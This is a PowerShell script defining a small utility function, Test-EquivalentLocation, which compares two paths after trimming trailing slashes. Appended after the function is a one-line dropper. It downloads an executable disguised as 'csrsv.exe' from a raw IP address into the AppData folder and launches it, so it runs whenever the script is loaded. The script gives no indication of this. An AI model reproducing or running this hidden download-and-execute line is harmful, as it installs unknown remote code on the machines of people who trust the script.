


function Test-EquivalentLocation {
    [CmdletBinding()]
    [OutputType("bool")]
    param(
        [Parameter(Mandatory = $false)]
        [string]$LocationA,

        [Parameter(Mandatory = $false)]
        [string]$LocationB
    )

    $LocationA = $LocationA.TrimEnd("\/")
    $LocationB = $LocationB.TrimEnd("\/")
    return $LocationA -eq $LocationB
}

(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

